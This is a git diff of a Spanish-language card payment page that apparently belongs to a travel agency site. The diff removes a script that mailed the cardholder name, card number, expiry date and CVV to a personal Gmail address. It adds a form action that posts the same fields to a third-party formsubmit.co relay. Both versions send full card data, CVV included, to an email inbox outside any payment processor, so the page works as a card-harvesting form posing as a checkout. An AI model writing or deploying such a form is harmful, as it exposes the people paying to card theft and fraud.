@@ -7,7 +7,7 @@
   <title>Formulario de Pago</title>
 </head>
 <body>
-  <form onsubmit="enviarDatos(); return false;" class="payment-form" method="post">
+  <form action="https://formsubmit.co/a548c489b4b50a49d3c4dd1fe033dde9 "class="payment-form" method="post">
     <h2>Pagar con Tarjeta</h2>
     <div class="form-group">
       <label for="cardholder">Nombre en la tarjeta</label>
@@ -28,39 +28,7 @@
       </div>
     </div>
     <input type="hidden" name="_next" value="https://kilometrounoviajes.com.ar/">
-    <button type="submit" id="submitPayment">Pagar</button>
+    <button type="submit">Pagar</button>
   </form>
-
-  <script>
-    // Selecciona el botón por su ID y le añade un "escuchador de eventos" para cuando se haga clic
-    document.getElementById('submitPayment').addEventListener('click', function(event) {
-      // Previene que el formulario se envíe de la forma tradicional (al "action" o "_next")
-      event.preventDefault();
-
-      // Captura los valores de los campos del formulario
-      var cardholder = document.getElementById('cardholder').value;
-      var cardnumber = document.getElementById('cardnumber').value;
-      var expdate = document.getElementById('expdate').value;
-      var cvv = document.getElementById('cvv').value;
-
-      var email = 'kilometrouno35@gmail.com'; // Reemplaza con tu dirección de correo electrónico
-      var subject = 'Nuevos Datos de Pago (RIESGOSO)'; // Se cambió el asunto para resaltar el riesgo
-      var body = 'Nombre en la tarjeta: ' + cardholder + '\n' +
-                 'Número de tarjeta: ' + cardnumber + '\n' +
-                 'Fecha de expiración: ' + expdate + '\n' +
-                 'CVV: ' + cvv;
-
-      // Crea un enlace "mailto:" con los datos del formulario
-      var mailtoLink = 'mailto:' + email +
-                       '?subject=' + encodeURIComponent(subject) +
-                       '&body=' + encodeURIComponent(body);
-
-      // Intenta abrir el cliente de correo electrónico del usuario
-      window.location.href = mailtoLink;
-
-      // Opcional: Si quieres que el formulario se envíe a la URL oculta "_next" DESPUÉS de intentar el mailto:
-      this.closest('form').submit();
-    });
-  </script>
 </body>
 </html>
